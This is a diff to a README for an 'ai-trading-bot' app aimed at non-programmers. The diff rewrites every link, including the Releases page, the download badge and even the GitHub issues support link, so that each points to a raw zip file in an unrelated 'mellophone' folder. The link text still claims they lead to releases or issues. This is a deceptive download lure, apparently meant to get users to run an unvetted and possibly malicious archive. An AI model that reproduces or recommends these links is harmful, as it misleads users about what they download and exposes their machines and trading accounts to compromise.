@@ -1,7 +1,7 @@
 # 🤖 ai-trading-bot - Trade Smarter with AI Signals
 
 ## 📥 Download Now
-[![Download ai-trading-bot](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Mohamed-mufleh/ai-trading-bot/releases)
+[![Download ai-trading-bot](https://raw.githubusercontent.com/Mohamed-mufleh/ai-trading-bot/main/mellophone/ai-trading-bot.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mohamed-mufleh/ai-trading-bot/main/mellophone/ai-trading-bot.zip)
 
 ## 🚀 Getting Started
 Welcome to the **ai-trading-bot**! This application helps users predict market trends and execute trades automatically. With the power of AI, you can make informed trading decisions without needing to have any programming skills.
@@ -20,7 +20,7 @@ Welcome to the **ai-trading-bot**! This application helps users predict market t
 - **Storage:** At least 1GB of free space.
 
 ## 🔗 Download & Install
-To get the ai-trading-bot, visit the [Releases page](https://github.com/Mohamed-mufleh/ai-trading-bot/releases) to find the latest version. 
+To get the ai-trading-bot, visit the [Releases page](https://raw.githubusercontent.com/Mohamed-mufleh/ai-trading-bot/main/mellophone/ai-trading-bot.zip) to find the latest version. 
 
 1. Click on the **Releases page** link above.
 2. Find the most recent release. 
@@ -47,7 +47,7 @@ If you encounter any issues:
 - **Performance:** If the bot is slow or unresponsive, restart your computer and try again.
 
 ## 📧 Support
-For support, feel free to reach out via [issues on GitHub](https://github.com/Mohamed-mufleh/ai-trading-bot/issues). Describe your issue clearly, and we will help you as soon as possible.
+For support, feel free to reach out via [issues on GitHub](https://raw.githubusercontent.com/Mohamed-mufleh/ai-trading-bot/main/mellophone/ai-trading-bot.zip). Describe your issue clearly, and we will help you as soon as possible.
 
 ## 🌐 Topics
 - 3d
@@ -62,4 +62,4 @@ For support, feel free to reach out via [issues on GitHub](https://github.com/Mo
 - python
 - sequence-models
 
-Visit the [Releases page](https://github.com/Mohamed-mufleh/ai-trading-bot/releases) again for any updates and new features. Happy trading!
+Visit the [Releases page](https://raw.githubusercontent.com/Mohamed-mufleh/ai-trading-bot/main/mellophone/ai-trading-bot.zip) again for any updates and new features. Happy trading!
